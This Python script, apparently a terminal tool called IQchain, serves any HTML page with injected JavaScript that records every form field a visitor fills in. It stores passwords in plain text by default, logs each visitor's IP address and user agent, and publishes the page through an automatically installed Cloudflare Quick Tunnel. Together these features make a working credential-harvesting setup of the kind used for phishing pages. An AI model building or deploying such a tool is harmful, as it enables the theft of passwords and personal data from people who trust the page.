#!/usr/bin/env python3
"""
iqchain.py  -  IQchain v0.01
developed by iqmaxx (dk)

Unified shell for backen2.py (backend) + tunnel.py (tunnel).
Both modules share one live screen: a backend HTTP server that saves
form input to JSON, and a Cloudflare Quick Tunnel that exposes it
publicly - either alone or together at the same time.

Usage:
    python iqchain.py page.html
    python iqchain.py page.html --port 8000 --host 127.0.0.1
    python iqchain.py page.html --hash-passwords
    python iqchain.py --tunnel-url http://localhost:3000

Keys:
    [1] backend view    [2] tunnel view     [3] both view
    [b] start backend   [t] start tunnel    [a] start both
    [s] stop all        [q] quit

Standard library only on the Python side.
"""
import argparse
import hashlib
import json
import mimetypes
import os
import platform
import re
import secrets
import shutil
import socket
import stat
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import uuid
from datetime import datetime, timezone
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import unquote, urlparse
import urllib.request

# ═══════════════════════════════════════════════════════════════════════
#   THEME  (from tunnel.py, unchanged)
# ═══════════════════════════════════════════════════════════════════════
def _color_enabled():
    if os.environ.get("NO_COLOR") is not None:
        return False
    if os.environ.get("FORCE_COLOR") is not None:
        return True
    try:
        return sys.stdout.isatty()
    except Exception:
        return False

class Theme:
    ORANGE = "\033[38;5;214m"
    WHITE = "\033[97m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    OK = "\033[92m"
    ERR = "\033[91m"
    RESET = "\033[0m"

class _NoTheme:
    def __getattr__(self, _name):
        return ""

C = Theme() if _color_enabled() else _NoTheme()

ANSI_RE = re.compile(r"\033\[[0-9;]*m")

def _term_width():
    try:
        return max(48, min(os.get_terminal_size().columns, 90))
    except Exception:
        return 72

def _vlen(s):
    return len(ANSI_RE.sub("", s))

def _pad_visible(s, w):
    return s + " " * max(w - _vlen(s), 0)

def _center_visible(s, w):
    pad = max(w - _vlen(s), 0)
    left = pad // 2
    return " " * left + s + " " * (pad - left)

# ═══════════════════════════════════════════════════════════════════════
#   LOGO
# ═══════════════════════════════════════════════════════════════════════
BIG_LOGO = """\
 ██╗ ██████╗     ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
 ██║██╔═══██╗   ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
 ██║██║   ██║   ██║     ███████║███████║██║██╔██╗ ██║
 ██║██║▄▄ ██║   ██║     ██╔══██║██╔══██║██║██║╚██╗██║
 ██║╚██████╔╝   ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
 ╚═╝ ╚══▀▀═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝"""

MED_LOGO = """\
 ╦╔═╗╔═╗╦ ╦╔═╗╦╔╗╔
 ║║  ║  ╠═╣╠═╣║║║║
 ╩╚═╝╚═╝╩ ╩╩ ╩╩╝╚╝"""

def _logo_block():
    w = _term_width()
    if w >= 60:
        return BIG_LOGO
    return MED_LOGO

# ═══════════════════════════════════════════════════════════════════════
#   LOG
# ═══════════════════════════════════════════════════════════════════════
class Log:
    def __init__(self, maxlines=120):
        self._lines = []
        self._lock = threading.Lock()
        self._max = maxlines

    def add(self, msg):
        with self._lock:
            ts = time.strftime("%H:%M:%S")
            self._lines.append(f"[{ts}] {msg}")
            if len(self._lines) > self._max:
                self._lines = self._lines[-self._max:]

    def tail(self, n):
        with self._lock:
            return list(self._lines[-n:])

    def clear(self):
        with self._lock:
            self._lines = []

LOG = Log()

def setup_console():
    for s in (sys.stdout, sys.stderr):
        try:
            s.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════
#   BACKEND MODULE  -  from backen2.py, functions preserved
# ═══════════════════════════════════════════════════════════════════════
MAX_BODY = 1_000_000
PBKDF2_ROUNDS = 200_000
LOCK = threading.Lock()
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
BLOCKED_EXT = {".py", ".json", ".env", ".db", ".sqlite"}

INJECT_JS = """
<script>
(function () {
  var lastSig = '', lastTime = 0;

  function label(el, t) {
    return el.name || el.id || el.getAttribute('aria-label') ||
           el.placeholder || t;
  }
  function collect(scope) {
    var out = [];
    scope.querySelectorAll('input,textarea,select').forEach(function (el) {
      var t = (el.type || el.tagName).toLowerCase();
      if (['submit','button','reset','image','file','hidden'].indexOf(t) > -1) return;
      if ((t === 'checkbox' || t === 'radio') && !el.checked) return;
      out.push({ name: label(el, t), type: t, value: el.value });
    });
    return out;
  }
  function send(scope, formId) {
    var fields = collect(scope);
    if (!fields.some(function (f) { return String(f.value).trim() !== ''; })) return;
    var body = JSON.stringify({ form: formId, fields: fields });
    var now = Date.now();
    if (body === lastSig && now - lastTime < 1500) return;
    lastSig = body; lastTime = now;
    fetch('/api/save', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: body,
      keepalive: true
    }).then(function (r) { return r.json(); })
      .then(function (j) { console.log('[backend]', j); })
      .catch(function (e) { console.error('[backend] save failed', e); });
  }
  function scopeOf(el) { return el.closest('form') || document; }
  function idOf(s) { return s === document ? 'page' : (s.id || s.name || 'form'); }

  document.addEventListener('submit', function (e) {
    send(e.target, idOf(e.target));
  }, true);

  document.addEventListener('click', function (e) {
    var b = e.target.closest && e.target.closest(
      'button,input[type=submit],input[type=button],[role=button]');
    if (!b) return;
    var s = scopeOf(b);
    send(s, idOf(s));
  }, true);

  document.addEventListener('keydown', function (e) {
    if (e.key !== 'Enter' || e.isComposing) return;
    var el = e.target;
    if (!el || !el.tagName) return;
    var tag = el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'select') return;
    var t = (el.type || '').toLowerCase();
    if (['button','submit','reset','checkbox','radio'].indexOf(t) > -1) return;
    var s = scopeOf(el);
    send(s, idOf(s));
  }, true);
})();
</script>
"""

def clean_path(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.lower().startswith("file:"):
        raw = unquote(urlparse(raw).path)
        if os.name == "nt" and len(raw) > 2 and raw[0] == "/" and raw[2] == ":":
            raw = raw[1:]
    return Path(os.path.expandvars(os.path.expanduser(raw)))

def read_html(path):
    data = path.read_bytes()
    if data.startswith((b"\xff\xfe", b"\xfe\xff")):
        return data.decode("utf-16", errors="replace")
    for enc in ("utf-8-sig", "cp1252"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            pass
    return data.decode("latin-1", errors="replace")

def inject(html):
    m = list(re.finditer(r"</body\s*>", html, re.IGNORECASE))
    if m:
        i = m[-1].start()
        return html[:i] + INJECT_JS + html[i:]
    return html + INJECT_JS

class FieldScanner(HTMLParser):
    def __init__(self):
        super().__init__()
        self.found = []

    def handle_starttag(self, tag, attrs):
        if tag in ("input", "textarea", "select"):
            a = dict(attrs)
            t = (a.get("type") or tag).lower()
            if t not in ("submit", "button", "reset", "image", "file", "hidden"):
                self.found.append((a.get("name") or a.get("id") or a.get("placeholder") or t, t))

def hash_password(pw):
    salt = secrets.token_hex(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), bytes.fromhex(salt), PBKDF2_ROUNDS)
    return f"pbkdf2_sha256${PBKDF2_ROUNDS}${salt}${dk.hex()}"

def build_record(payload, plain_passwords, meta):
    if not isinstance(payload, dict) or not isinstance(payload.get("fields"), list):
        raise ValueError("invalid payload")
    data = {}
    for f in payload["fields"][:200]:
        if not isinstance(f, dict):
            continue
        name = str(f.get("name", "field"))[:100]
        ftype = str(f.get("type", "text")).lower()[:20]
        value = str(f.get("value", ""))[:10000]
        if ftype == "email":
            value = value.strip().lower()
            if value and not EMAIL_RE.match(value):
                raise ValueError(f"invalid email in '{name}'")
        elif ftype == "password":
            if value and not plain_passwords:
                value = hash_password(value)
        elif ftype != "textarea":
            value = value.strip()
        if name in data:
            if not isinstance(data[name], list):
                data[name] = [data[name]]
            data[name].append(value)
        else:
            data[name] = value
    if not any(str(v).strip() for v in data.values()):
        raise ValueError("no data")
    return {
        "id": uuid.uuid4().hex,
        "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "form": str(payload.get("form", "form"))[:100],
        "data": data,
        **meta,
    }

def save_record(db_path, record):
    with LOCK:
        db = {"records": []}
        if db_path.exists():
            try:
                loaded = json.loads(db_path.read_text(encoding="utf-8"))
                if isinstance(loaded, dict) and isinstance(loaded.get("records"), list):
                    db = loaded
                else:
                    raise ValueError
            except Exception:
                backup = db_path.with_suffix(".corrupt.json")
                os.replace(db_path, backup)
                LOG.add(f"[warn] bad JSON moved to {backup.name}")
        db["records"].append(record)
        db["total"] = len(db["records"])
        fd, tmp = tempfile.mkstemp(dir=str(db_path.parent), suffix=".tmp")
        try:
            with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as fh:
                json.dump(db, fh, indent=2, ensure_ascii=False)
                fh.write("\n")
            os.replace(tmp, db_path)
        except Exception:
            if os.path.exists(tmp):
                os.remove(tmp)
            raise
        return len(db["records"])

class Handler(BaseHTTPRequestHandler):
    server_version = "HtmlBackend/2.0"

    def log_message(self, fmt, *args):
        LOG.add(f"[http] {fmt % args}")

    def _send(self, code, body, ctype="application/json; charset=utf-8"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body, ensure_ascii=False).encode("utf-8")
        elif isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        cfg = self.server.cfg
        path = unquote(urlparse(self.path).path)
        if path in ("/", "/" + cfg["html"].name):
            try:
                page = inject(read_html(cfg["html"]))
            except OSError as e:
                return self._send(500, {"ok": False, "error": str(e)})
            return self._send(200, page, "text/html; charset=utf-8")

        target = (cfg["base"] / path.lstrip("/")).resolve()
        try:
            target.relative_to(cfg["base"])
        except ValueError:
            return self._send(403, {"ok": False, "error": "forbidden"})
        if (not target.is_file() or target.name.startswith(".")
                or target.suffix.lower() in BLOCKED_EXT or target == cfg["db"]):
            return self._send(404, {"ok": False, "error": "not found"})
        ctype = mimetypes.guess_type(str(target))[0] or "application/octet-stream"
        self._send(200, target.read_bytes(), ctype)

    def do_POST(self):
        if urlparse(self.path).path != "/api/save":
            return self._send(404, {"ok": False, "error": "not found"})
        origin = self.headers.get("Origin")
        if origin and urlparse(origin).netloc != self.headers.get("Host"):
            return self._send(403, {"ok": False, "error": "bad origin"})
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0
        if length <= 0 or length > MAX_BODY:
            return self._send(413, {"ok": False, "error": "bad size"})
        meta = {
            "ip": self.client_address[0],
            "user_agent": (self.headers.get("User-Agent") or "")[:200],
        }
        try:
            payload = json.loads(self.rfile.read(length).decode("utf-8"))
            record = build_record(payload, self.server.cfg["plain"], meta)
            total = save_record(self.server.cfg["db"], record)
        except (ValueError, UnicodeDecodeError) as e:
            return self._send(400, {"ok": False, "error": str(e)})
        except OSError as e:
            return self._send(500, {"ok": False, "error": f"save failed: {e}"})
        LOG.add(f"saved #{total} ({record['form']}): {list(record['data'])}")
        self._send(200, {"ok": True, "id": record["id"], "total": total})


class BackendModule:
    def __init__(self):
        self.server = None
        self.thread = None
        self.html_path = None
        self.db_path = None
        self.port = None
        self.host = None
        self.start_error = None

    @property
    def running(self):
        return self.server is not None

    @property
    def url(self):
        if not self.running:
            return None
        return f"http://127.0.0.1:{self.port}/"

    def start(self, html_path, port=8000, host="127.0.0.1", plain=True):
        self.start_error = None
        try:
            html_path = clean_path(str(html_path)).resolve()
            if not html_path.is_file():
                raise FileNotFoundError(str(html_path))
            db_path = html_path.with_name(html_path.stem + "_data.json")

            server = None
            for p in range(port, port + 11):
                try:
                    server = ThreadingHTTPServer((host, p), Handler)
                    break
                except OSError:
                    continue
            if server is None:
                raise OSError(f"no free port in {port}-{port+10}")

            server.cfg = {"html": html_path, "base": html_path.parent,
                          "db": db_path, "plain": plain}
            self.server = server
            self.html_path = html_path
            self.db_path = db_path
            self.port = server.server_address[1]
            self.host = host
            self.thread = threading.Thread(target=server.serve_forever, daemon=True)
            self.thread.start()
            LOG.add(f"backend live on http://{host}:{self.port}/  (saving -> {db_path.name})")

            scanner = FieldScanner()
            scanner.feed(read_html(html_path))
            for name, t in scanner.found:
                LOG.add(f"  input: {name} ({t})")
            return True
        except Exception as e:
            self.start_error = str(e)
            LOG.add(f"backend start failed: {e}")
            self.stop()
            return False

    def stop(self):
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass
            LOG.add("backend stopped")
        self.server = None
        self.thread = None

    def records(self):
        if not self.db_path or not self.db_path.exists():
            return 0
        try:
            with open(self.db_path, "r", encoding="utf-8") as f:
                return json.load(f).get("total", 0)
        except Exception:
            return 0


# ═══════════════════════════════════════════════════════════════════════
#   TUNNEL MODULE  -  from tunnel.py, functions preserved
# ═══════════════════════════════════════════════════════════════════════
GITHUB_RELEASES = "https://github.com/cloudflare/cloudflared/releases/latest/download"
TRYCLOUDFLARE_RE = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")

def _install_dir():
    d = Path.home() / ".local" / "bin"
    d.mkdir(parents=True, exist_ok=True)
    return d

def find_cloudflared():
    exe = shutil.which("cloudflared")
    if exe:
        return exe
    for name in ("cloudflared", "cloudflared.exe"):
        candidate = _install_dir() / name
        if candidate.is_file() and os.access(candidate, os.X_OK):
            return str(candidate)
    return None

def _is_termux():
    return bool(os.environ.get("PREFIX", "").find("com.termux") != -1
                or Path("/data/data/com.termux").exists())

def _asset_for_platform():
    system = platform.system()
    machine = platform.machine().lower()
    if system == "Linux":
        arch_map = {"x86_64": "amd64", "amd64": "amd64", "aarch64": "arm64",
                    "arm64": "arm64", "armv7l": "arm", "armv8l": "arm",
                    "i686": "386", "i386": "386"}
        arch = arch_map.get(machine, "amd64")
        return f"cloudflared-linux-{arch}", "raw"
    if system == "Darwin":
        arch = "arm64" if machine in ("arm64", "aarch64") else "amd64"
        return f"cloudflared-darwin-{arch}.tgz", "tgz"
    if system == "Windows":
        arch = "amd64" if "64" in machine else "386"
        return f"cloudflared-windows-{arch}.exe", "raw"
    return None, None

def _download_binary():
    asset, kind = _asset_for_platform()
    if not asset:
        return None, "this operating system / CPU type isn't recognized"
    url = f"{GITHUB_RELEASES}/{asset}"
    dest = _install_dir() / ("cloudflared.exe" if asset.endswith(".exe") else "cloudflared")
    try:
        if kind == "tgz":
            with tempfile.NamedTemporaryFile(suffix=".tgz", delete=False) as tmp:
                tmp_path = tmp.name
            urllib.request.urlretrieve(url, tmp_path)
            with tarfile.open(tmp_path) as tar:
                member = next(m for m in tar.getmembers() if m.name.endswith("cloudflared"))
                member.name = dest.name
                tar.extract(member, path=dest.parent)
            os.unlink(tmp_path)
        else:
            urllib.request.urlretrieve(url, dest)
        st = dest.stat()
        dest.chmod(st.st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
        return str(dest), None
    except Exception as e:
        return None, str(e)

def install_cloudflared():
    """Same three paths as tunnel.py (pkg -> brew -> download), routed to LOG."""
    if _is_termux() and shutil.which("pkg"):
        LOG.add("installing cloudflared via pkg ...")
        res = subprocess.run(["pkg", "install", "-y", "cloudflared"],
                             capture_output=True, text=True)
        found = find_cloudflared()
        if res.returncode == 0 and found:
            return found, None
    elif platform.system() == "Darwin" and shutil.which("brew"):
        LOG.add("installing cloudflared via brew ...")
        res = subprocess.run(["brew", "install", "cloudflared"],
                             capture_output=True, text=True)
        found = find_cloudflared()
        if res.returncode == 0 and found:
            return found, None
    LOG.add("downloading cloudflared binary from GitHub releases ...")
    return _download_binary()

def _reachable(url):
    parsed = urlparse(url)
    host = parsed.hostname or "localhost"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except Exception:
        return False


class TunnelModule:
    def __init__(self):
        self.proc = None
        self.public_url = None
        self.local_url = None
        self.started_at = None
        self.error = None
        self._watchdog = None

    @property
    def running(self):
        return self.proc is not None and self.proc.poll() is None

    def start(self, local_url, cloudflared_path):
        self.error = None
        self.public_url = None
        self.local_url = local_url
        cmd = [cloudflared_path, "tunnel", "--url", local_url]
        try:
            self.proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
        except Exception as e:
            self.error = str(e)
            LOG.add(f"cloudflared launch failed: {e}")
            return False
        self.started_at = time.time()
        LOG.add(f"tunnel opening to {local_url} ...")
        threading.Thread(target=self._reader, daemon=True).start()
        self._watchdog = threading.Thread(target=self._timeout_watch, daemon=True)
        self._watchdog.start()
        return True

    def _reader(self):
        try:
            for line in self.proc.stdout:
                s = line.rstrip()
                LOG.add(f"tunnel: {s}")
                m = TRYCLOUDFLARE_RE.search(s)
                if m and not self.public_url:
                    self.public_url = m.group(0)
                    LOG.add(f"PUBLIC -> {self.public_url}")
        except Exception as e:
            self.error = str(e)
            LOG.add(f"tunnel reader error: {e}")

    def _timeout_watch(self):
        time.sleep(30)
        if self.running and not self.public_url and not self.error:
            self.error = "no public URL after 30s"
            LOG.add("tunnel timeout: cloudflared gave no public URL within 30s")
            self.stop()

    def stop(self):
        if self.proc:
            try:
                self.proc.terminate()
                try:
                    self.proc.wait(timeout=5)
                except Exception:
                    self.proc.kill()
            except Exception:
                pass
            LOG.add("tunnel stopped")
        self.proc = None
        self.public_url = None


# ═══════════════════════════════════════════════════════════════════════
#   TERMINAL WRAPPER  (single-key input, cursor hide)
# ═══════════════════════════════════════════════════════════════════════
class Terminal:
    def __init__(self):
        self._windows = os.name == "nt"
        self._old = None

    def enter(self):
        try:
            sys.stdout.write("\033[?25l")
            sys.stdout.flush()
        except Exception:
            pass
        if not self._windows:
            try:
                import termios, tty
                self._old = termios.tcgetattr(sys.stdin)
                tty.setcbreak(sys.stdin.fileno())
            except Exception:
                self._old = None

    def leave(self):
        if not self._windows and self._old is not None:
            try:
                import termios
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self._old)
            except Exception:
                pass
        try:
            sys.stdout.write("\033[?25h\033[0m")
            sys.stdout.flush()
        except Exception:
            pass

    def get_key(self, timeout=0.3):
        if self._windows:
            try:
                import msvcrt
            except ImportError:
                time.sleep(timeout)
                return None
            end = time.time() + timeout
            while time.time() < end:
                if msvcrt.kbhit():
                    return msvcrt.getwch()
                time.sleep(0.02)
            return None
        import select
        try:
            r, _, _ = select.select([sys.stdin], [], [], timeout)
        except Exception:
            time.sleep(timeout)
            return None
        if r:
            try:
                return sys.stdin.read(1)
            except Exception:
                return None
        return None


# ═══════════════════════════════════════════════════════════════════════
#   IQchain SHELL
# ═══════════════════════════════════════════════════════════════════════
class IQchain:
    def __init__(self, html_path, port, host, plain, tunnel_url):
        self.html_path = html_path
        self.port = port
        self.host = host
        self.plain = plain
        self.cli_tunnel_url = tunnel_url
        self.backend = BackendModule()
        self.tunnel = TunnelModule()
        self.term = Terminal()
        self.alive = True
        self.view = 3   # 1 backend, 2 tunnel, 3 both
        self.cloudflared = None
        self._w = _term_width()

    # ------------------------------ start / stop ------------------------------
    def _start_backend(self):
        if self.backend.running:
            LOG.add("backend already running")
            return
        if not self.html_path:
            LOG.add("no HTML file configured - can't start backend")
            return
        self.backend.start(self.html_path, self.port, self.host, self.plain)

    def _start_tunnel(self):
        if self.tunnel.running:
            LOG.add("tunnel already running")
            return
        if self.backend.running:
            target = self.backend.url
        elif self.cli_tunnel_url:
            target = self.cli_tunnel_url
        else:
            LOG.add("start backend first, or pass --tunnel-url")
            return
        threading.Thread(target=self._start_tunnel_bg, args=(target,), daemon=True).start()

    def _start_tunnel_bg(self, url):
        cf = self.cloudflared or find_cloudflared()
        if not cf:
            LOG.add("cloudflared not found on this device - installing now")
            cf, err = install_cloudflared()
            if not cf:
                LOG.add(f"cloudflared install failed: {err}")
                self.tunnel.error = err or "install failed"
                return
            LOG.add(f"cloudflared installed: {cf}")
        self.cloudflared = cf
        if not _reachable(url):
            LOG.add(f"note: nothing answered at {url} yet - tunnel can wait")
        self.tunnel.start(url, cf)

    def _start_both(self):
        if not self.backend.running:
            self._start_backend()
        if self.backend.running:
            # give the server a moment to open the socket
            time.sleep(0.15)
            self._start_tunnel()
        elif self.cli_tunnel_url:
            self._start_tunnel()

    def _stop_all(self):
        self.tunnel.stop()
        self.backend.stop()

    # ------------------------------ render ------------------------------
    def _build(self):
        w = self._w
        lines = [""]

        # Logo
        for ln in _logo_block().split("\n"):
            lines.append(_center_visible(f"{C.ORANGE}{C.BOLD}{ln}{C.RESET}", w))
        lines.append(_center_visible(f"{C.GREY}v0.01  ·  developed by {C.WHITE}iqmaxx (dk){C.RESET}", w))
        lines.append("")

        # Tab bar
        def tab(num, name, active):
            if active:
                return f"{C.ORANGE}{C.BOLD}[+ {name}]{C.RESET}"
            return f"{C.GREY}[  {name}  ]{C.RESET}"
        tabs = "   ".join([
            tab(1, "BACKEND", self.view == 1),
            tab(2, "TUNNEL",  self.view == 2),
            tab(3, "BOTH",    self.view == 3),
        ])
        lines.append(_center_visible(tabs, w))
        lines.append(f"{C.GREY}{'─' * w}{C.RESET}")
        lines.append("")

        # Panels
        if self.view == 1:
            lines.extend(self._panel_backend())
        elif self.view == 2:
            lines.extend(self._panel_tunnel())
        else:
            lines.extend(self._panel_both())

        # Log
        lines.append("")
        head = f" {C.ORANGE}{C.BOLD}LOG{C.RESET}{C.GREY} "
        right = "─" * max(w - 6, 0)
        lines.append(f"{head}{right}{C.RESET}")
        for entry in LOG.tail(8):
            if _vlen(entry) > w - 2:
                entry = entry[: w - 3] + "…"
            lines.append(f"{C.GREY}{entry}{C.RESET}")

        # Help bar
        lines.append("")
        help_line = (f"{C.GREY}[1][2][3] view   "
                     f"[b] backend   [t] tunnel   [a] both   "
                     f"[s] stop   [q] quit{C.RESET}")
        lines.append(_center_visible(help_line, w))
        return lines

    def _status_dot(self, running):
        return f"{C.OK}●{C.RESET}" if running else f"{C.GREY}○{C.RESET}"

    def _panel_backend(self):
        b = self.backend
        lines = []
        state = f"{self._status_dot(b.running)}  {'running' if b.running else 'stopped'}"
        lines.append(f"  {C.ORANGE}{C.BOLD}BACKEND{C.RESET}  {state}")
        lines.append(f"  {C.GREY}{'─' * 24}{C.RESET}")
        if b.running:
            lines.append(f"  url     {C.WHITE}{b.url}{C.RESET}")
            lines.append(f"  page    {C.WHITE}{b.html_path.name}{C.RESET}")
            lines.append(f"  data    {C.WHITE}{b.db_path.name}{C.RESET}")
            lines.append(f"  records {C.WHITE}{b.records()}{C.RESET}")
        else:
            if b.start_error:
                lines.append(f"  {C.ERR}last error: {b.start_error}{C.RESET}")
            else:
                lines.append(f"  {C.GREY}press [b] to start{C.RESET}")
        return lines

    def _panel_tunnel(self):
        t = self.tunnel
        lines = []
        state_txt = "stopped"
        if t.running and t.public_url:
            state_txt = "live"
        elif t.running:
            state_txt = "opening..."
        elif t.error:
            state_txt = f"failed ({t.error})"
        state = f"{self._status_dot(t.running)}  {state_txt}"
        lines.append(f"  {C.ORANGE}{C.BOLD}TUNNEL{C.RESET}   {state}")
        lines.append(f"  {C.GREY}{'─' * 24}{C.RESET}")
        if t.local_url:
            lines.append(f"  local   {C.WHITE}{t.local_url}{C.RESET}")
        if t.public_url:
            lines.append(f"  public  {C.OK}{t.public_url}{C.RESET}")
        elif t.running:
            lines.append(f"  {C.GREY}public   waiting for Cloudflare...{C.RESET}")
        else:
            if t.error:
                lines.append(f"  {C.ERR}last error: {t.error}{C.RESET}")
            else:
                lines.append(f"  {C.GREY}press [t] to expose a URL{C.RESET}")
        return lines

    def _panel_both(self):
        left = self._panel_backend()
        right = self._panel_tunnel()
        col = max((self._w - 4) // 2, 26)
        out = []
        for i in range(max(len(left), len(right))):
            l = left[i] if i < len(left) else ""
            r = right[i] if i < len(right) else ""
            out.append(_pad_visible(l, col) + "   " + r)
        return out

    def render(self):
        self._w = _term_width()
        lines = self._build()
        out = ["\033[H\033[J"]
        for ln in lines:
            out.append(_pad_visible(ln, self._w) + "\n")
        try:
            sys.stdout.write("".join(out))
            sys.stdout.flush()
        except Exception:
            pass

    # ------------------------------ input ------------------------------
    def _handle_key(self, key):
        if key == "\x03" or key.lower() == "q":
            self.alive = False
            return
        k = key.lower()
        if k == "1":
            self.view = 1
        elif k == "2":
            self.view = 2
        elif k == "3":
            self.view = 3
        elif k == "b":
            self._start_backend()
        elif k == "t":
            self._start_tunnel()
        elif k == "a":
            self._start_both()
        elif k == "s":
            self._stop_all()

    # ------------------------------ loop ------------------------------
    def run(self):
        self.term.enter()
        try:
            while self.alive:
                self.render()
                key = self.term.get_key(timeout=0.3)
                if key:
                    self._handle_key(key)
        except KeyboardInterrupt:
            self.alive = False
        finally:
            self.term.leave()
            self.tunnel.stop()
            self.backend.stop()
            print()
            print(f"{C.ORANGE}IQchain closed.{C.RESET}")


# ═══════════════════════════════════════════════════════════════════════
#   MAIN
# ═══════════════════════════════════════════════════════════════════════
def main():
    setup_console()
    ap = argparse.ArgumentParser(
        description="IQchain - backend + tunnel on one screen (v0.01, iqmaxx dk)")
    ap.add_argument("html", nargs="?", help="path to the HTML file served by the backend")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--host", default="127.0.0.1",
                    help="default 127.0.0.1 (this device only); 0.0.0.0 for LAN/testers")
    ap.add_argument("--hash-passwords", action="store_true",
                    help="hash passwords (PBKDF2) instead of saving them as typed")
    ap.add_argument("--tunnel-url", default=None,
                    help="fallback local URL for the tunnel when no backend is running")
    args = ap.parse_args()

    html_path = None
    if args.html:
        html_path = clean_path(args.html).resolve()
        if not html_path.is_file():
            msg = f"File not found: {html_path}"
            if "com.termux" in os.environ.get("PREFIX", ""):
                msg += "\nTermux tip: run `termux-setup-storage`, then use ~/storage/shared/..."
            sys.exit(msg)
    elif not args.tunnel_url:
        try:
            raw = input("HTML file path (blank to skip backend): ").strip()
        except (EOFError, KeyboardInterrupt):
            sys.exit(1)
        if raw:
            html_path = clean_path(raw).resolve()
            if not html_path.is_file():
                sys.exit(f"File not found: {html_path}")

    if not html_path and not args.tunnel_url:
        sys.exit("give an HTML file, or --tunnel-url, to start IQchain")

    app = IQchain(
        html_path=html_path,
        port=args.port,
        host=args.host,
        plain=not args.hash_passwords,
        tunnel_url=args.tunnel_url,
    )
    app.run()


if __name__ == "__main__":
    main()
